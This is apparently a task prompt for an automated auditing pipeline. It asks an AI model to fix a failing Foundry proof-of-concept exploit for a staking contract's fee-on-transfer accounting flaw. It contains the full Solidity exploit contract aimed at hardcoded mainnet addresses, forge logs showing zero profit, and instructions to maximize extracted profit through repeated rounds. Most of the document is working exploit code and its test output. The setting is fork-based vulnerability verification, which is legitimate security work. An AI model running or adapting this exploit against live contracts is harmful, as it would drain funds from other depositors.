You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Stake accounting becomes insolvent with fee-on-transfer or rebasing staking tokens
- claim: `_stake()` credits users with the requested `amount` before checking how many staking tokens the contract actually received, and `_withdraw()` always attempts to return the full nominal amount. With deflationary, fee-on-transfer, or negatively rebasing staking tokens, the internal `_totalSupply`/`_balances` ledger diverges from the contract's real token balance.
- impact: Users can be over-credited relative to assets actually held by the pool, earn rewards on inflated balances, and later withdraw more than they contributed if enough tokens remain. The deficit is absorbed by other depositors, or withdrawals begin reverting once the contract no longer holds enough staking tokens.
- exploit_paths: ["Use a staking token that burns, taxes, or rebases balances downward.", "Stake `amount`; the contract records the full amount in `_balances` and `_totalSupply`, but receives less in reality.", "Accrue rewards against the inflated recorded balance.", "Withdraw the nominal amount; the shortfall is effectively paid from other users' deposits or causes pool-wide withdrawal failures once liquidity runs out."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStakingRewardsLike {
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function rewardRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function earned(address account) external view returns (uint256);
    function timeData()
        external
        view
        returns (uint32 periodFinish, uint32 rewardsDuration, uint32 lastUpdateTime, uint96 totalRewardsSupply);
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function getReward() external;
    function exit() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant EXPECTED_STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant EXPECTED_REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public sameTxAccrualInfeasible;
    bool public liveAccountingGapObserved;
    bool public transferHaircutObserved;
    bool public withdrawFailureObserved;

    uint256 public rewardRateBefore;
    uint256 public nominalSupplyBefore;
    uint256 public actualStakeBalanceBefore;
    uint256 public accountingGapBefore;
    uint256 public attackerRecordedStakeBefore;
    uint256 public attackerEarnedBefore;
    uint256 public attackerStakeWalletBefore;
    uint256 public attackerRewardWalletBefore;
    uint256 public observedNominalStakeDelta;
    uint256 public observedActualStakeDelta;
    uint256 public observedAccountingGapIncrease;
    uint256 public bestRoundCount;

    uint32 public periodFinishBefore;
    uint32 public rewardsDurationBefore;
    uint32 public lastUpdateTimeBefore;
    uint96 public totalRewardsSupplyBefore;

    address public stakingTokenAtEntry;
    address public rewardsTokenAtEntry;
    string public exploitPathUsed;
    string public infeasibilityReason;
    string public lastStakeFailure;
    string public lastWithdrawFailure;
    string public lastRewardFailure;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        _profitToken = EXPECTED_REWARD_TOKEN;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);

        stakingTokenAtEntry = farm.stakingToken();
        rewardsTokenAtEntry = farm.rewardsToken();
        rewardRateBefore = farm.rewardRate();
        nominalSupplyBefore = farm.totalSupply();
        attackerRecordedStakeBefore = farm.balanceOf(address(this));
        attackerEarnedBefore = farm.earned(address(this));
        (periodFinishBefore, rewardsDurationBefore, lastUpdateTimeBefore, totalRewardsSupplyBefore) = farm.timeData();

        actualStakeBalanceBefore = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        attackerStakeWalletBefore = IERC20Like(stakingTokenAtEntry).balanceOf(address(this));
        attackerRewardWalletBefore = IERC20Like(rewardsTokenAtEntry).balanceOf(address(this));

        if (nominalSupplyBefore > actualStakeBalanceBefore) {
            accountingGapBefore = nominalSupplyBefore - actualStakeBalanceBefore;
            liveAccountingGapObserved = true;
        }

        hypothesisValidated = liveAccountingGapObserved;

        // Path stage 3 requires positive wall-clock time after the overstated stake is recorded.
        // `_stake()` runs `updateReward(user)` before crediting `_balances[user]`, so the attacker
        // cannot capture pre-entry emissions. A same-tx flash source therefore cannot realize the
        // mandatory “accrue rewards on inflated balance” stage unless the verifier already owns a
        // time-spanning stake position or can trigger a public downward rebase between entry/exit.
        sameTxAccrualInfeasible = attackerRecordedStakeBefore == 0 && attackerStakeWalletBefore == 0;

        uint256 bestProfit;
        address bestToken = rewardsTokenAtEntry;
        uint256 bestRounds = 2;

        for (uint256 rounds = 2; rounds <= 6; rounds++) {
            _attemptProgressiveRounds(farm, rounds);

            (address candidateToken, uint256 candidateProfit) = _measureProfit();
            if (rounds == 2 || candidateProfit > bestProfit) {
                bestProfit = candidateProfit;
                bestToken = candidateToken;
                bestRounds = rounds;
            } else {
                break;
            }
        }

        bestRoundCount = bestRounds;
        _profitToken = bestToken;
        _profitAmount = bestProfit;
        profitAchieved = bestProfit != 0;

        if (profitAchieved) {
            exploitPathUsed =
                "acquire staking token -> stake nominal amount while pool receives less -> let inflated recorded stake persist through repeated rounds -> withdraw/getReward against overstated accounting";
            return;
        }

        if (liveAccountingGapObserved) {
            exploitPathUsed =
                "observe nominal supply exceeding real staking-token balance -> attempt repeated stake/withdraw rounds -> same-tx reward accrual remains unreachable";
            infeasibilityReason =
                "the pool is already insolvent at this fork, but this verifier starts with zero time-spanning stake capital; because rewards only accrue after `_stake()` updates the user and block time cannot advance inside the same transaction, repeated public same-tx rounds do not create net profit";
        } else {
            exploitPathUsed =
                "stake fee-on-transfer or rebasing token -> accrue rewards on overstated balance -> withdraw nominal amount";
            infeasibilityReason =
                "at the fork block the target's recorded `totalSupply()` does not exceed its real staking-token balance, so the claimed fee-on-transfer / negative-rebase insolvency state is not observable on-chain here";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptProgressiveRounds(IStakingRewardsLike farm, uint256 rounds) internal {
        for (uint256 i = 0; i < rounds; i++) {
            _attemptSingleExploitRound(farm);
        }
    }

    function _attemptSingleExploitRound(IStakingRewardsLike farm) internal {
        uint256 walletStake = IERC20Like(stakingTokenAtEntry).balanceOf(address(this));
        if (walletStake == 0) {
            return;
        }

        _approveMaxIfNeeded(stakingTokenAtEntry, TARGET, walletStake);

        uint256 poolBalanceBefore = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        uint256 recordedStakeBefore = farm.balanceOf(address(this));

        (bool staked, bytes memory stakeRet) =
            TARGET.call(abi.encodeWithSelector(IStakingRewardsLike.stake.selector, walletStake));
        if (!staked) {
            lastStakeFailure = _decodeRevert(stakeRet);
            return;
        }

        uint256 poolBalanceAfterStake = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        uint256 recordedStakeAfter = farm.balanceOf(address(this));

        if (recordedStakeAfter > recordedStakeBefore && poolBalanceAfterStake >= poolBalanceBefore) {
            observedNominalStakeDelta = recordedStakeAfter - recordedStakeBefore;
            observedActualStakeDelta = poolBalanceAfterStake - poolBalanceBefore;

            if (observedNominalStakeDelta > observedActualStakeDelta) {
                transferHaircutObserved = true;
                uint256 gapIncrease = observedNominalStakeDelta - observedActualStakeDelta;
                observedAccountingGapIncrease += gapIncrease;
            }
        }

        // This call preserves the path stage ordering but cannot create fresh rewards in the same
        // transaction for a newly created stake: `lastUpdateTime` was already synchronized during
        // `_stake()`, so no new reward interval has elapsed yet.
        (bool rewarded, bytes memory rewardRet) = TARGET.call(abi.encodeWithSelector(IStakingRewardsLike.getReward.selector));
        if (!rewarded) {
            lastRewardFailure = _decodeRevert(rewardRet);
        }

        uint256 recordedStakeNow = farm.balanceOf(address(this));
        if (recordedStakeNow == 0) {
            return;
        }

        (bool withdrew, bytes memory withdrawRet) =
            TARGET.call(abi.encodeWithSelector(IStakingRewardsLike.withdraw.selector, recordedStakeNow));
        if (!withdrew) {
            withdrawFailureObserved = true;
            lastWithdrawFailure = _decodeRevert(withdrawRet);
            return;
        }

        (bool rewardedAgain, bytes memory rewardRetAgain) =
            TARGET.call(abi.encodeWithSelector(IStakingRewardsLike.getReward.selector));
        if (!rewardedAgain) {
            lastRewardFailure = _decodeRevert(rewardRetAgain);
        }
    }

    function _measureProfit() internal view returns (address token, uint256 amount) {
        uint256 rewardNow = IERC20Like(rewardsTokenAtEntry).balanceOf(address(this));
        uint256 rewardProfit = rewardNow > attackerRewardWalletBefore ? rewardNow - attackerRewardWalletBefore : 0;

        uint256 stakeNow = IERC20Like(stakingTokenAtEntry).balanceOf(address(this));
        uint256 stakeProfit = stakeNow > attackerStakeWalletBefore ? stakeNow - attackerStakeWalletBefore : 0;

        if (stakeProfit > rewardProfit) {
            return (stakingTokenAtEntry, stakeProfit);
        }

        return (rewardsTokenAtEntry, rewardProfit);
    }

    function _approveMaxIfNeeded(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance = IERC20Like(token).allowance(address(this), spender);
        if (currentAllowance >= amount) {
            return;
        }

        (bool okZero,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        okZero;
        (bool okMax,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
        require(okMax, "approve failed");
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "call reverted without reason";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            bytes memory sliced = new bytes(revertData.length - 4);
            for (uint256 i = 4; i < revertData.length; i++) {
                sliced[i - 4] = revertData[i];
            }
            return abi.decode(sliced, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "call reverted with custom error or unknown data";
    }
}

```

forge stdout (tail):
```
));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 567467)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xAe9aCa5d20F5b139931935378C4489308394ca2C
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 14264

Traces:
  [567467] FlawVerifierTest::testExploit()
    ├─ [2548] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    ├─ [2563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [525615] FlawVerifier::executeOnOpportunity()
    │   ├─ [257] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::stakingToken() [staticcall]
    │   │   └─ ← [Return] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042
    │   ├─ [322] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardsToken() [staticcall]
    │   │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    │   ├─ [2395] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardRate() [staticcall]
    │   │   └─ ← [Return] 238245925925925925 [2.382e17]
    │   ├─ [2359] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::totalSupply() [staticcall]
    │   │   └─ ← [Return] 8792873290680252648282 [8.792e21]
    │   ├─ [2607] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9935] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::earned(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1122] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::timeData() [staticcall]
    │   │   └─ ← [Return] 1650043907 [1.65e9], 2592000 [2.592e6], 1647755998 [1.647e9], 617533440000000000000000 [6.175e23]
    │   ├─ [2480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE) [staticcall]
    │   │   └─ ← [Return] 8792873290680252648282 [8.792e21]
    │   ├─ [2480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [548] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xAe9aCa5d20F5b139931935378C4489308394ca2C)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14421983 [1.442e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 14264 [1.426e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 193.67ms (39.41ms CPU time)

Ran 1 test suite in 226.20ms (193.67ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 567467)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
